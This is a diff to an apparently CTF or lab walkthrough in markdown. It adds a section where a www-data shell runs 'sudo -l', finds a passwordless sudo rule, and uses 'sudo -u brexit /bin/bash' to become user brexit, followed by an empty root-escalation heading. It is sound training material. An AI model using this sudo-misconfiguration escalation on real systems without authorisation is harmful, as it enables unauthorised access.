@@ -100,7 +100,35 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data) 
 ```
 
-## 4.Privilege Escalation
+## 4.Privilege Escalation (brexit)
+
+Check for sudo permissions :
+
+```bash
+$ sudo -l
+Matching Defaults entries for www-data on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on localhost:
+    (brexit) NOPASSWD: /bin/bash
+```
+
+and yes we can now escalate to `brexit`:
+
+```bash
+$ sudo -u brexit /bin/bash
+id
+uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)
+```
+
+## 5.Privilege Escalation (root)
+
+
+
+
+
+
+
 
 
 
